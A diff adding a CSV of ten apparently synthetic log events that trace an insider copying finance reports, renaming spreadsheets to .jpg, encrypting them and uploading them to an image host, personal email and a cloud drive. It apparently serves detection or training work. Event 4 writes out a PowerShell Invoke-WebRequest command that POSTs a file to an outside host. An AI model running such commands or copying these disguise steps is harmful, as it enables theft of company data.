@@ -1,0 +1,11 @@
+event_id,timestamp,user,host,action,notes,log_text
+1,2025-05-22T18:02:44Z,jdoe,WORKSTATION-12,usb_mount,"USB storage device connected","User jdoe connected USB storage device 'SanDisk32GB' to WORKSTATION-12 at 6:02 PM."
+2,2025-05-22T18:03:11Z,jdoe,WORKSTATION-12,file_copy,"Bulk file copy to USB","Over 500 files copied from directory \\corpfiles\\finance\\2025-reports to removable drive."
+3,2025-05-22T18:04:55Z,jdoe,WORKSTATION-12,file_rename,"Sensitive data renamed to image files","Multiple .xlsx and .csv files were renamed to .jpg before being copied to USB."
+4,2025-05-22T18:06:02Z,jdoe,WORKSTATION-12,powershell_script,"Suspicious obfuscated upload script","PowerShell executed command: Invoke-WebRequest https://imgshare.site/upload -Method POST -InFile 'report_final.jpg'"
+5,2025-05-22T18:06:21Z,jdoe,WORKSTATION-12,network_upload,"Unusual outbound upload to image-hosting domain","Large data transfer (40MB) uploaded to external site imgshare.site via HTTPS."
+6,2025-05-22T18:07:12Z,jdoe,WORKSTATION-12,file_modification,"Files compressed and encrypted","User created encrypted archive finance_pics.zip with AES password protection."
+7,2025-05-22T18:09:33Z,jdoe,WORKSTATION-12,email_send,"Personal email exfil attempt","User sent email to personal Gmail with subject 'vacation pics', attached encrypted zip file."
+8,2025-05-22T18:11:05Z,jdoe,WORKSTATION-12,web_upload,"Cloud drive upload","User uploaded finance_pics.zip to personal Google Drive account."
+9,2025-05-22T18:14:50Z,jdoe,WORKSTATION-12,process_creation,"Image editing tool used oddly","photoshop.exe opened finance.jpg which was originally a renamed spreadsheet."
+10,2025-05-22T18:18:35Z,jdoe,WORKSTATION-12,odd_hours,"Activity past normal work hours","All exfiltration-related actions occurred after 6 PM, outside jdoe's normal behavior window."
